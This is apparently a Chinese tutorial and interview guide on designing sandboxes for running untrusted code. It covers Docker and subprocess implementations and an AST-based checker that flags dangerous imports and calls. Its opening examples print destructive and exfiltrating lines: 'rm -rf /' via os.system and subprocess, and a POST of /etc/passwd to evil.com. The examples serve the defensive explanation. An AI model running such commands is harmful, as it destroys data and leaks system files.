# 执行沙箱设计 🛡️

## 一、为什么需要沙箱？

### 安全风险示例

**❌ 危险代码1：删除文件**
```python
import os
os.system("rm -rf /")  # 删除根目录！
```

**❌ 危险代码2：访问网络**
```python
import requests
requests.post("https://evil.com", data=open("/etc/passwd").read())  # 窃取数据！
```

**❌ 危险代码3：耗尽资源**
```python
# 无限循环
while True:
    pass
```

**❌ 危险代码4：执行系统命令**
```python
import subprocess
subprocess.run(["rm", "-rf", "/"])
```

### 沙箱的作用

| 作用 | 说明 |
|------|------|
| **隔离执行** | 代码在隔离环境中运行，不影响宿主 |
| **资源限制** | 限制CPU、内存、磁盘使用 |
| **网络控制** | 禁止或限制网络访问 |
| **文件系统隔离** | 只能访问特定目录 |
| **权限控制** | 以最低权限运行 |

---

## 二、沙箱设计的核心原则

### 1. 最小权限原则
代码只能执行任务所需的最小权限集

### 2. 深度防御
多层防护，一层被突破还有下一层

### 3. 故障隔离
沙箱崩溃不影响整个系统

### 4. 审计日志
记录所有操作，便于追溯

## 三、Docker沙箱实现方案

### 1. 基础Docker沙箱

```python
import docker
import tempfile
import os

class DockerSandbox:
    def __init__(self):
        self.client = docker.from_env()
        
    def execute_code(self, code, timeout=30):
        # 创建临时目录
        with tempfile.TemporaryDirectory() as tmpdir:
            # 写入代码文件
            code_path = os.path.join(tmpdir, "main.py")
            with open(code_path, "w", encoding="utf-8") as f:
                f.write(code)
            
            try:
                # 运行容器
                container = self.client.containers.run(
                    "python:3.11-slim",
                    f"python /tmp/main.py",
                    volumes={tmpdir: {"bind": "/tmp", "mode": "ro"}},
                    network_disabled=True,  # 禁用网络
                    mem_limit="128m",      # 内存限制
                    cpu_quota=50000,       # CPU限制
                    pids_limit=64,         # 进程数限制
                    read_only=True,        # 只读文件系统
                    tmpfs={"/tmp": "size=64m"},  # tmpfs
                    detach=True,
                    auto_remove=False
                )
                
                # 等待执行完成
                result = container.wait(timeout=timeout)
                logs = container.logs(stdout=True, stderr=True).decode("utf-8")
                
                return {
                    "success": result["StatusCode"] == 0,
                    "exit_code": result["StatusCode"],
                    "output": logs
                }
                
            except docker.errors.TimeoutError:
                container.kill()
                return {
                    "success": False,
                    "error": "执行超时",
                    "exit_code": -1
                }
            finally:
                try:
                    container.remove(force=True)
                except:
                    pass

# 使用示例
sandbox = DockerSandbox()
result = sandbox.execute_code("print('Hello, World!')")
print(result)
```

### 2. 安全加固的Docker沙箱

```python
class SecureDockerSandbox:
    def __init__(self):
        self.client = docker.from_env()
        
    def execute_code(self, code, timeout=30):
        with tempfile.TemporaryDirectory() as tmpdir:
            code_path = os.path.join(tmpdir, "main.py")
            with open(code_path, "w", encoding="utf-8") as f:
                f.write(code)
            
            # 安全配置
            security_options = [
                "no-new-privileges",  # 禁止提升权限
                "apparmor=docker-default",
                "seccomp=default"
            ]
            
            # 只读路径
            read_only_paths = [
                "/",
                "/usr",
                "/lib",
                "/bin"
            ]
            
            # tmpfs路径
            tmpfs_paths = {
                "/tmp": "size=64m,noexec,nosuid,nodev",
                "/dev/shm": "size=64m,noexec,nosuid,nodev"
            }
            
            try:
                container = self.client.containers.run(
                    "python:3.11-slim",
                    f"python /tmp/main.py",
                    volumes={tmpdir: {"bind": "/code", "mode": "ro"}},
                    working_dir="/code",
                    network_disabled=True,
                    mem_limit="128m",
                    memswap_limit="128m",
                    cpu_quota=50000,
                    cpu_period=100000,
                    pids_limit=64,
                    ulimits=[
                        docker.types.Ulimit(name="nofile", soft=1024, hard=1024)
                    ],
                    security_opt=security_options,
                    read_only=True,
                    tmpfs=tmpfs_paths,
                    cap_drop=["ALL"],  # 丢弃所有能力
                    detach=True,
                    auto_remove=False
                )
                
                result = container.wait(timeout=timeout)
                logs = container.logs(stdout=True, stderr=True).decode("utf-8")
                
                return {
                    "success": result["StatusCode"] == 0,
                    "exit_code": result["StatusCode"],
                    "output": logs
                }
                
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "exit_code": -1
                }
            finally:
                try:
                    container.remove(force=True)
                except:
                    pass
```

## 四、不使用Docker的轻量级沙箱

### 1. 使用subprocess + 限制

```python
import subprocess
import resource
import os

class LightweightSandbox:
    def __init__(self):
        pass
        
    def execute_code(self, code, timeout=30):
        with tempfile.TemporaryDirectory() as tmpdir:
            code_path = os.path.join(tmpdir, "main.py")
            with open(code_path, "w", encoding="utf-8") as f:
                f.write(code)
            
            # 设置资源限制（仅Linux有效）
            def set_limits():
                # CPU时间限制
                resource.setrlimit(resource.RLIMIT_CPU, (timeout, timeout))
                # 内存限制
                resource.setrlimit(resource.RLIMIT_AS, (128 * 1024 * 1024, 128 * 1024 * 1024))
                # 文件大小限制
                resource.setrlimit(resource.RLIMIT_FSIZE, (64 * 1024 * 1024, 64 * 1024 * 1024))
                # 进程数限制
                resource.setrlimit(resource.RLIMIT_NPROC, (64, 64))
            
            try:
                result = subprocess.run(
                    ["python", code_path],
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    cwd=tmpdir,
                    preexec_fn=set_limits if os.name != "nt" else None
                )
                
                return {
                    "success": result.returncode == 0,
                    "exit_code": result.returncode,
                    "output": result.stdout,
                    "error": result.stderr
                }
                
            except subprocess.TimeoutExpired:
                return {
                    "success": False,
                    "error": "执行超时",
                    "exit_code": -1
                }
            except Exception as e:
                return {
                    "success": False,
                    "error": str(e),
                    "exit_code": -1
                }
```

## 五、多层防御策略

### 第1层：代码审查

在执行前先审查代码，阻止明显的危险操作：

```python
import ast

class CodeAnalyzer(ast.NodeVisitor):
    def __init__(self):
        self.dangerous_calls = []
        self.dangerous_imports = []
        
    def visit_Import(self, node):
        for name in node.names:
            if name.name in ["os", "subprocess", "sys"]:
                self.dangerous_imports.append(name.name)
        self.generic_visit(node)
        
    def visit_ImportFrom(self, node):
        if node.module in ["os", "subprocess"]:
            self.dangerous_imports.append(node.module)
        self.generic_visit(node)
        
    def visit_Call(self, node):
        if isinstance(node.func, ast.Name):
            if node.func.id in ["eval", "exec", "compile", "open", "__import__"]:
                self.dangerous_calls.append(node.func.id)
        self.generic_visit(node)

def analyze_code(code):
    analyzer = CodeAnalyzer()
    try:
        tree = ast.parse(code)
        analyzer.visit(tree)
        return {
            "safe": len(analyzer.dangerous_calls) == 0 and len(analyzer.dangerous_imports) == 0,
            "dangerous_calls": analyzer.dangerous_calls,
            "dangerous_imports": analyzer.dangerous_imports
        }
    except SyntaxError as e:
        return {
            "safe": False,
            "error": f"语法错误: {e}"
        }

# 使用示例
result = analyze_code("import os; os.system('rm -rf /')")
print(result)
```

## 六、面试要点

### 高频面试题

1. **沙箱的核心安全措施有哪些？**
   - 隔离执行（Docker/虚拟机）
   - 资源限制（CPU/内存/磁盘/进程数）
   - 网络控制（禁用或白名单）
   - 文件系统隔离（只读/ tmpfs）
   - 权限控制（最小权限）
   - 代码审查

2. **为什么Docker适合做沙箱？**
   - 轻量级隔离
   - 资源限制方便
   - 支持只读文件系统
   - 网络控制灵活
   - 镜像标准化

3. **沙箱的性能开销如何平衡？**
   - Docker沙箱：隔离好，开销中等
   - 轻量级沙箱：隔离一般，开销小
   - 根据场景选择：安全要求高用Docker，追求性能用轻量
